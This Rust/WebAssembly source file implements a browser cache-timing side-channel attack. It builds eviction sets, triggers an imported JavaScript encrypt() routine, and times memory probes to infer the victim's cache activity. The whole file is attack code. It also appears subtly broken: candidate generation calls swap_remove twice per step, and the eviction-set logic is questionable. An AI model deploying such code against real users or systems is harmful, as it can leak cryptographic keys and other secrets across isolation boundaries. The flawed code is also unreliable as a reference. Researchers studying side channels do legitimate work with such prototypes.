mod config;

use std::collections::LinkedList;
use wasm_bindgen::{prelude::wasm_bindgen, JsValue, convert::IntoWasmAbi};
use web_sys::console::{log_1, log_2};
use crate::config::Config;

const CACHE_LINE_SIZE : usize = 64;
const CACHE_ASSOCIATIVITY : usize = 12;

#[wasm_bindgen(module = "/js/js-to-rust.js")]
extern "C" {
    fn getTime() -> u32;
    fn encrypt();
    fn random() -> f64;
}

#[inline(always)]
fn probe(target: &[u8], offset: u32) -> u32 {
    let start = getTime();
    {
        let _ = target[offset as usize];
    }
    getTime() - start
}

#[inline(always)]
fn evict(target: &[u8], eviction_set: &LinkedList<u32>) {
    eviction_set
        .iter()
        .for_each(|offset| {
            let _ = target[*offset as usize];
        });
}

#[inline(always)]
fn wait(number_of_cycles: u32) {
    let mut i = 0;
    while i < number_of_cycles {
        i += 1;
    }
}

fn get_slow_time(eviction_set: &LinkedList<u32>, target: &[u8], offset: u32) -> u32 {
    evict(target, eviction_set);
    probe(target, offset)
}

fn generate_conflict_set(eviction_sets: &Vec<LinkedList<u32>>) -> LinkedList<u32> {
    eviction_sets
        .iter()
        .flatten()
        .cloned()
        .collect()
}

fn generate_eviction_set(target: &[u8], probe: u32, candidate_set: &LinkedList<u32>, threshold: u32) -> LinkedList<u32> {
    let mut candidate_set = candidate_set.clone();
    let mut eviction_set : LinkedList<u32> = LinkedList::new();
    while let Some(random_offset) = candidate_set.pop_front() {
        if eviction_set.len() >= CACHE_ASSOCIATIVITY {
            break;
        }
        let mut new_eviction_set : LinkedList<u32> = eviction_set.clone();
        new_eviction_set.append(& mut candidate_set);
        if threshold < get_slow_time(&new_eviction_set, target, probe) {
            eviction_set.push_back(random_offset);
        }
    }
    eviction_set
}

fn generate_candidate_set(target: &[u8]) -> LinkedList<u32> {
    let number_of_candidates = target.len() / CACHE_LINE_SIZE;
    let mut candidates : Vec<usize> = (0..number_of_candidates).collect();
    (0..number_of_candidates)
        .map(|_| {
            let index : usize = (random() * ((candidates.len() - 1) as f64)) as usize;
            let offset : u32 = candidates.swap_remove(index) as u32;
            candidates.swap_remove(index);
            offset
        })
        .collect()
}

#[wasm_bindgen]
pub extern "C" fn flush_reload(threshold: u32, time_slots: u32, wait_cycles: u32, time_slot_size: u32, probes: &[u32], target: &[u8]) -> Box<[u32]> {
    log_2(&"time_slots:".into(), &JsValue::from_f64(time_slots as f64));
    log_2(&"threshold:".into(), &JsValue::from_f64(threshold as f64));
    log_2(&"wait_cycles:".into(), &JsValue::from_f64(wait_cycles as f64));
    log_2(&"time_slot_size:".into(), &JsValue::from_f64(time_slot_size as f64));
    log_1(&format!("probe: {:?}", probes.iter().cloned().collect::<Vec<u32>>()).into());
    log_1(&format!("probe: {:?}", target.len()).into());
    let candidate_set : LinkedList<u32> = generate_candidate_set(target.as_ref());
    let eviction_sets : Vec<LinkedList<u32>> = probes //config.probes
        .iter()
        .map(|offset| generate_eviction_set(target.as_ref(), *offset, &candidate_set, threshold))
        .collect();
    let conflict_set : LinkedList<u32> = generate_conflict_set(&eviction_sets);
    encrypt();
    let results : Vec<u32> = (0..time_slots)
        .flat_map(|_| {
            let start = getTime();
            let time_slot_results : Vec<u32> = probes
                .iter()
                .map(|p| probe(target.as_ref(), *p))
                .collect();
            evict(target.as_ref(), &conflict_set);
            while getTime() - start < time_slot_size {
                wait(wait_cycles);
            }
            time_slot_results
        })
        .collect();
    results.into_boxed_slice()
}
